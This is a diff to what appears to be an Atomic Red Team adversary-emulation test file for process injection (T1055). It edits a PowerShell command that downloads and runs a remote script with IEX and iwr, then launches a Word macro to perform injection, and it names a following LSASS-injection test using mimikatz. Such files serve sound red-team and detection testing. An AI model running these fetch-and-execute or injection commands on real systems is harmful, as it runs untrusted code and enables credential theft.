@@ -26,7 +26,7 @@ atomic_tests:
       Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
       Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
     name: powershell
 - name: Remote Process Injection in LSASS via mimikatz
